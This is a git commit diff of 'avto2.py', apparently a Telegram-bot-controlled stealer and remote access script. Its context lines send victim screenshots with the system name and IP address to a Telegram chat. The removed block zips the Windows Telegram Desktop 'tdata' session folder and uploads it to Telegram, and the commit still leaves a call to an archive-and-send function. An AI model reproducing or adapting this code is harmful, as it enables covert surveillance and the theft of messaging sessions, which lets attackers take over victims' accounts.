b9d52733688fcca1852b41f3536453cf813d9bc1
vovanskaie <136624664+vovanskaie@users.noreply.github.com>
2024-03-18 20:04:22 +0300

    Update avto2.py

--- avto2.py
+++ avto2.py
@@ -284,7 +284,6 @@ def start(message):
     itembtn11 = types.KeyboardButton('/code')
     markup.add(itembtn1, itembtn2, itembtn3, itembtn4, itembtn5, itembtn6, itembtn7, itembtn8, itembtn9, itembtn10, itembtn11)
     bot.send_message(chat_id, "Выберите команду:", reply_markup=markup)
-
 def send_message_to_group(chat_id, screenshot):
     url = f"https://api.telegram.org/bot{telegram_bot_token}/sendPhoto"
     data = {'chat_id': chat_id, 'caption': f"System Name: {system_name}\nIP Address: {ip}"}
@@ -343,25 +342,6 @@ def archive_and_send():
 @bot.message_handler(commands=['archive_and_send'])
 def handle_archive_and_send(message):
     chat_id = message.chat.id
-    def archive_and_send():
-        user = os.path.expanduser("~")
-        if os.path.exists(user + "\\AppData\\Roaming\\Telegram Desktop\\tdata"):
-            try:
-                source_dir = user + '\\AppData\\Roaming\\Telegram Desktop\\tdata'
-                temp_dir = os.path.join(os.getcwd(), 'temp')
-                if not os.path.exists(temp_dir):
-                    os.makedirs(temp_dir)  # Создаем папку, если её нет
-                output_zip = os.path.join(temp_dir, 'Mraks_By_sx180')
-    
-                created_zip = create_zip_archive(source_dir, output_zip)
-                if created_zip:
-                    send_file_to_telegram(created_zip, 'Mraks_By_sx180.zip')
-                else:
-                    print("Failed to create or send zip file.")
-            except Exception as e:
-                print(f"Error creating or sending zip file: {str(e)}")
-        else:
-            print("Папка 'tdata' не найдена.")
     archive_and_send()
     bot.send_message(chat_id, "Архивация и отправка файла завершены.")
 
